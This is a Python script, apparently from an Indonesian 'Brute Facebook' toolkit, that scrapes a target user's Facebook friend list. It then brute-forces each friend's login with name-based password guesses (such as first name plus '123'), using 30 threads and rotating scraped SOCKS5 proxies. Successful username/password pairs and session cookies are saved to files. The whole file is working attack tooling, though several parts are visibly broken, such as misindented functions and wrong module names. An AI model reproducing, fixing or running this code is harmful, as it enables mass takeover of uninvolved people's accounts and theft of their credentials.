#######################################################
# Name           : Brute Facebook (BF)                #
# File           : dump.py                            #
# Author         : Moch Yayan Juan Alvredo XD.        #
# Github         : https://github.com/Yayan-XD        #
# Facebook       : https://www.facebook.com/KM39453   #
# Website        : https://www.yayanxd.my.id          #
# Python version : 0.4                                #
#######################################################

############# DON'T REMOVE THIS FUNCTIONS #############

import requests as r, re, sys, random

from bs4 import BeautifulSoup as par
from concurrent.futures import ThreadPoolExecutor as upil
from datetime import date
from datetime import datetime
from rich import print as prints
from rich.panel import Panel
merah  = '[#FF0022]'
hapus  = '[/]'
biru_m = '[bold cyan]'
hijau  = '[#00FF33]'
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
H = '\x1b[1;92m' # HIJAU
M = '\x1b[1;91m' # MERAH
ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
 	if n < 0 or n > 12:
 		exit()
 	nTemp = n - 1
except ValueError:
 	exit()
current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
merah  = '[#FF0022]'
hijau  = '[#00FF33]'
kuning = '[#FFFF00]'
hapus  = '[/]'
biru_m = '[bold cyan]'
warna_rich = random.choice(["[bold red]","[deep_pink3]","[blue]","[green]","[cyan]"])
warna = random.choice(["[deep_pink3]","[green]","[cyan]","[blue]"])
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m' #
ta = current.year
bu = current.month
ha = current.day
op = bulan_[nTemp]
tanggal = '%s-%s-%s'%(ha,op,ta)
tanggal.split('/')
loop = 0
id = []
ok = []
cp = []

try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92mÃ¢â‚¬Â¢\x1b[1;97m] [\x1b[1;96mCluuuut')
prox=open('.prox.txt','r').read().splitlines()

def real_time():
	from time import time
	return str(time()).split('.')[0]


class Dump:
    def __init__(self):
        self.id, self.id2 = [], []
        self.ses = r.Session()

    def convert(self, uid):
        if "me" in uid:
            return {"uid":uid}
        elif(re.findall("\w+",uid)):
            p = r.get(f"https://mbasic.facebook.com/{uid}?_rdr").text
            try:
                user = re.findall('\;rid\=(\d+)\&',str(p))[0]
            except:
                user = uid
        return {"uid":user}


    def dump_free(self, cok, tok):
        try:
            prints(Panel(f"""[{merah}+{hapus}] user trial cuma bisa mengambil [bold red]1000[/] id...
[{biru_m}*{hapus}] Ketik 'me' jika ingin crack dari daftar teman anda."""))
            try:user = input(f'  [{O}*{N}] masukan id atau username : '); uid = self.convert(user)
            except AttributeError:exit(f"\n  {N}[{M}Ã—{N}] username atau id tidak benar")
            tol = self.ses.get(f"https://graph.facebook.com/{uid.get('uid')}?fields=friends.fields(id,name,username).limit(1000)&access_token={tok}",cookies=cok).json()
            for x in tol["friends"]["data"]:
                try:self.id.append(x["id"]+"<=>"+x["name"])
                except:self.id.append(x["username"]+"<=>"+x["name"])
        except KeyError:
            exit(f"  {N}[{M}Ã—{N}] gagal mengambil id, kemungkinan id tidaklah publik")
        self.pilihan_id(self.id)

    def dump_prem(self, cok, tok):
        try:
            prints(Panel(f"[{biru_m}*{hapus}] Ketik 'me' jika ingin crack dari daftar teman anda."))
            try:user = input(f'  [{O}*{N}] masukan id atau username : '); uid = self.convert(user)
            except AttributeError:exit(f"\n  {N}[{M}Ã—{N}] username atau id tidak benar")
            tol = self.ses.get(f"https://graph.facebook.com/{uid.get('uid')}?fields=friends.fields(id,name,username)&access_token={tok}",cookies=cok).json()
            for x in tol["friends"]["data"]:
                try:self.id.append(x["id"]+"<=>"+x["name"])
                except:self.id.append(x["username"]+"<=>"+x["name"])
        except KeyError:
            exit(f"  {N}[{M}Ã—{N}] gagal mengambil id, kemungkinan id tidaklah publik")
        self.Crack(self.id)


    def pilihan_id(self, xx):
        prints(Panel(f"[{biru_m}*[/]] total id : [bold red]{len(xx)}[/]"))
        prints(Panel(f"""[{biru_m}01[/]] Crack dari akun tertua  ({merah}Not Recommended[/])
[{biru_m}02[/]] Crack dari akun termuda ({hijau}Recommended[/])
[{biru_m}03[/]] Acak urutan berdasarkan id ([bold blue]Highly Recommended[/])""", title=f"{hijau}SETTING URUTAN ID{hapus}"))
        zx = input(f"  [{M}?{N}] pilih: ")
        if zx in["1", "01"]:
            for ih in xx:
                self.id2.insert(0, ih)
        elif zx in["2", "02"]:
            for ih in xx:
                self.id2.append(ih)
        elif zx in["3", "03"]:
            for ih in xx:
                wq = random.randint(0,len(self.id2))
                self.id2.insert(wq, ih)
        else:
            print("");prints(Panel(f"🤔¡ input yang bener"));self.pilihan_id(xx)
        self.Crack(self.id2)


    def Crack(self, id):
        ask = input("\n * menggunakan sandi manual..? [Y/t]: ")
        if ask in ["", " "]:
            exit("\n * isi yang benar jangan kosong")
        elif ask in ["y", "Y"]:
            pwx = input(" * tebak kata sandi : ")
            if len(pwx)<=5:
               exit("\n * kata sandi minimal 6 karakter")
            prints(f'\n * 01. FACEBOOK LITE \n * 02. BROWSER')
            method = input("\n * pilih : ")
            if method in ["1", "01"]:
                with upil(max_workers=30) as coeg:
                    print("\n * hasil OK disimpan ke : OK/%s.txt"%(tanggal))
                    print(" * hasil CP disimpan ke : CP/%s.txt\n"%(tanggal))
                    for user in self.id:
                        uid, name = user.split("<=>")
                        coeg.submit(lite, uid, pwx.split(','))
                print("\n\n [#] crack selesai...")
                exit()
            elif method in ["2", "02"]:
                with upil(max_workers=30) as coeg:
                    print("\n * hasil OK disimpan ke : OK/%s.txt"%(tanggal))
                    print(" * hasil CP disimpan ke : CP/%s.txt\n"%(tanggal))
                    for user in self.id:
                        uid, name = user.split("<=>")
                        coeg.submit(browser, uid, pwx.split(','))
                print("\n\n [#] crack selesai...")
                exit()
        elif ask in ["t", "T"]:
            prints(f'\n * 01. FACEBOOK LITE \n * 02. BROWSER')
            method = input("\n * pilih : ")
            if method in ["1", "01"]:
                with upil(max_workers=30) as coeg:
                    print("\n * hasil OK disimpan ke : OK/%s.txt"%(tanggal))
                    print(" * hasil CP disimpan ke : CP/%s.txt\n"%(tanggal))
                    for user in self.id:
                        try:
                            uid, name = user.split("<=>")
                            ss = name.split(" ")
                            pwx = [ name, ss[0]+ss[1], ss[0]+"123", ss[0]+"12345" ]
                            coeg.submit(lite2, uid, pwx)
                        except:pass
                print("\n\n [#] crack selesai...")
                exit()
            elif method in ["2", "02"]:
                with upil(max_workers=30) as coeg:
                    print("\n * hasil OK disimpan ke : OK/%s.txt"%(tanggal))
                    print(" * hasil CP disimpan ke : CP/%s.txt\n"%(tanggal))
                    for user in self.id:
                        try:
                            uid, name = user.split("<=>")
                            ss = name.split(" ")
                            pwx = [ name, ss[0]+ss[1], ss[0]+"123", ss[0]+"12345" ]
                            coeg.submit(browser2, uid, pwx)
                        except:pass
                print("\n\n [#] crack selesai...")
                exit()

	def browser(user,pwx):
		print("\r * %s/%s OK[ %s ]-CP[ %s ]"%(loop,len(self.id),len(ok),len(cp)),end=' ');sys.stdout.flush()
		rr = open("uaku.txt", "r").read().splitlines()
		uaa=random.choice(rr)
		nip=random.choice(prox)
		proxs= {'http': 'socks5://'+nip}
		ses=r.session()
		for pw in pwx:
			head1 = {
				'Host':'m.facebook.com',
				'cache-control':'max-age=0',
				'upgrade-insecure-requests':'1',
				'user-agent':uaa,
				'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				'sec-fetch-mode':'navigate',
				'sec-fetch-user':'?1',
				'sec-fetch-dest':'document',
				'accept-encoding':'gzip, deflate',
				'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
			}
			try:
				r=ses.get(f"https://m.facebook.com/", headers=head1).text.encode('utf-8')
			except:
				r=ses.get(f"https://m.facebook.com/", headers=head1).text
			date = {"lsd": re.search('name="lsd" value="(.*?)"',str(r)).group(1), "jazoest": re.search('name="jazoest" value="(.*?)"',str(r)).group(1), "m_ts": re.search('name="m_ts" value="(.*?)"',str(r)).group(1), "li": re.search('name="li" value="(.*?)"',str(r)).group(1), "try_number": "0", "unrecognized_tries": "0", "email": user, "pass": pw}
			head2={
				'Host':'m.facebook.com',
				'user-agent':uaa,
				'content-type':'application/x-www-form-urlencoded',
				'x-fb-lsd':re.search('name="lsd" value="(.*?)"', str(r)).group(1),
				'accept':'*/*',
				'origin':'https://m.facebook.com',
				'sec-fetch-site':'same-origin',
				'sec-fetch-mode':'cors',
				'sec-fetch-dest':'empty',
				'referer':'https://m.facebook.com/',
				'accept-encoding':'gzip, deflate',
				'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
			}
			p=ses.post(f"https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=101",data=date,headers=head2, proxies=proxs, allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				cok = ses.cookies.get_dict()
				koki=('datr='+cok['datr'])+';'+('c_user='+cok['c_user'])+';'+('fr='+cok['fr'])+';'+('xs='+cok['xs'])
				print("\r *\033[1;34m OK | %s | %s | %s \n\033[0m * %s"%(user,pw,koki,uaa))
				ok.append("%s|%s"%(user, pw))
				open("OK/%s.txt"%(tanggal),"a").write(" * %s|%s\n"%(user, pw))
				break
			elif "checkpoint" in ses.cookies.get_dict():
				print("\r * \033[1;93mCP | %s | %s \n\033[0m * \033[1;96mUSER AGENT : \033[1;31m%s \033[0m"%(user,pw,uaa))
				cp.append("%s|%s"%(user, pw))
				open("CP/%s.txt"%(tanggal),"a").write("%s|%s\n"%(user, pw))
				break
			else:
				continue

		loop+=1
